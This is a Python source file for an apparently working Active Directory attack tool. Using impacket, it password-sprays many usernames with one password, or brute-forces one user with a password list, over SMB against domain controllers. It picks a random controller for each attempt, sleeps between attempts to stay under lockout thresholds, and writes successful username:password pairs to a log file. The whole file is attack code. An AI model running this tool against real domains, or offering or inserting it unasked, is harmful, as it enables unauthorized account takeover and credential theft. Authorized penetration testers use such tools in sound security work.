import sys
import time
import argparse
import datetime
from random import randrange
from impacket.smbconnection import SMBConnection, SessionError


def single_user_bruteforce(username, password_file, domain, sleeptime, domain_controllers, output_filename):
    """
    Single user bruteforce functionality (one user, many passwords)

    Args:
        username: (string) Username to use in the attack
        password_file: (string) Path to a list of passwords to use in the attack
        domain: (string) Domain to use in the attack
        sleeptime: (int) Seconds to sleep between login attempts
        domain_controllers: (string) A list of domain controllers to attempt logins against
        output_filename: (string) Name of the file to write to
    """

    f = open(password_file, 'r')
    passwords_raw = f.readlines()
    passwords = [x.strip() for x in passwords_raw]

    time_units = "seconds"

    print(f"[*] Number of passwords: {str(len(passwords))}")
    print(f"[*] Target username: {username}")

    time_est = sleeptime * len(passwords)

    if time_est >=60:
        time_est = time_est / 60
        time_units = "minutes"
    if time_est >= 60:
        time_est = time_est / 60
        time_units = "hours"

    print(f"[+] Time estimate is around {str(time_est)} {time_units}")
    print(f"[*] Output file name: {output_filename}")

    count = 0

    for password in passwords:
        dc_index = randrange(len(domain_controllers))
        dc = domain_controllers[dc_index]

        count += 1

        if count % 50 == 0:
            print(f"[*] Progress: password {str(count)} of {str(len(passwords))}")

        password = password.strip()
        test_credentials(username, password, domain, dc, output_filename)
        time.sleep(sleeptime)


def password_spray(user_file, password, domain, sleeptime, domain_controllers, output_filename):
    """
    Password spray functionality (many users, one password)

    Args:
        user_file: (string) Path to a file of usernames
        password: (string) Password to use in the attack
        domain: (string) Domain to use in the attack
        sleeptime: (int) Seconds to sleep between login attempts
        domain_controllers: (string) A list of domain controllers to attempt logins against
        output_filename: (string) Name of the file to write to
    """

    f = open(user_file, 'r')
    users_raw = f.readlines()
    users = [x.strip() for x in users_raw]

    time_units = "seconds"

    print(f"[*] Number of users: {str(len(users))}")
    print(f"[*] Spray password: {password}")

    time_est = sleeptime * len(users)

    if time_est >=60:
        time_est = time_est / 60
        time_units = "minutes"
    if time_est >= 60:
        time_est = time_est / 60
        time_units = "hours"

    print(f"[+] Time estimate is around {str(time_est)} {time_units}")
    print(f"[*] Output file name: {output_filename}")

    count = 0

    for user in users:
        dc_index = randrange(len(domain_controllers))
        dc = domain_controllers[dc_index]
        count += 1

        if count % 50 == 0:
            print(f"[*] Progress: user {str(count)} of {str(len(users))}")

        user = user.strip()
        test_credentials(user, password, domain, dc, output_filename)
        time.sleep(sleeptime)


def format_and_output(output_filename, data):
    """
    Formats provided data into the apropriate output format and writes to a file.

    Args:
        output_filename: (string) Name of the file to write to
        data: (string) Data to be formatted and written

    Returns:
        None
    """

    f = open(output_filename, 'a')
    f.write(f"{data}\n")
    f.close()


def test_credentials(username, password, domain, host, output_filename):
    """
    Attempts a login to the target hosts using the specified credentials and domain

    Args:
        username: (string) Username to attempt the login for
        password: (string) Password to use for the login attempt
        domain: (string) Domain to use for the login attempt
        host: (string) IP address to attempt the login against
        output_filename: (string) Name of the file to write to

    Returns:
        None
    """

    try:
        conn = SMBConnection(host, host, sess_port=int(445))
        conn.login(username, password, domain)
        print(f"\t\t[+] Authentication successful for {username}:{password}")
        format_and_output(output_filename, f"[+] Authentication successful for {username}:{password}")

    except Exception as e:
        print(f"\t\t[-] Authentication failed for {username}:{password}: {str(e)}")
        format_and_output(output_filename, f"[-] Authentication failed for {username}:{password}: {str(e)}")


def main():
    """
    Main program function

    Args:
        None

    Returns:
        None
    """

    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="Domain name for the targeted domain", required=True)
    parser.add_argument("-dc", "--domaincontroller", help="Domain controller IP", required=False)
    parser.add_argument("-uf", "--userfile", help="A file containing domain usernames to spray, one username per line", required=False)
    parser.add_argument("-p", "--password", help="Password to use for spraying", required=False)
    parser.add_argument("-u", "--username", help="Username to use for a single user bruteforce", required=False)
    parser.add_argument("-pf", "--passwordfile", help="A file containing passwords for a single user bruteforce, one password per line", required=False)
    parser.add_argument("-f", "--dcfile", help="List of domain controller IPs to test logins against, one IP per line", required=False)
    parser.add_argument("-s", "--sleeptime", help="Sleep interval between attempts, default is 30", required=False)
    args = parser.parse_args()

    try:
        sleeptime = int(args.sleeptime)
    except:
        sleeptime = 5

    domain = args.domain

    if args.userfile and args.password:
        user_file = args.userfile
        password = args.password
        mode = "spray"

    elif args.username and args.passwordfile:
        username = args.username
        password_file = args.passwordfile
        mode = "single"

    else:
        print(f"[-] Error: You must enter a username + password file or password + username file")
        sys.exit(1)

    start_time = datetime.datetime.now().strftime("%B-%d-%Y-%I-%M")
    output_filename = f"spraying_output-{start_time}.txt"
    domain_controllers = []

    if args.dcfile:
        try:
            with open(args.dcfile) as f:
                lines = f.readlines()

            domain_controllers = [x.strip() for x in lines]
        except Exception as e:
            print(f"[-] Error reading list of domain controllers: {str(e)}")
            sys.exit(1)
    else:
        try:
            domain_controllers = [args.domaincontroller]
        except:
            print("[-] Error: You must enter a list of domain controllers, or a single domain controller IP")
            sys.exit(1)

    print(f"[*] List of domain controllers:")
    for dc in domain_controllers:
        print(f"\t{dc}")

    if mode == "spray":
        password_spray(user_file, password, domain, sleeptime, domain_controllers, output_filename)

    else:
        single_user_bruteforce(username, password_file, domain, sleeptime, domain_controllers, output_filename)

    print("[*] Attack complete")


if __name__ == "__main__":
    main()
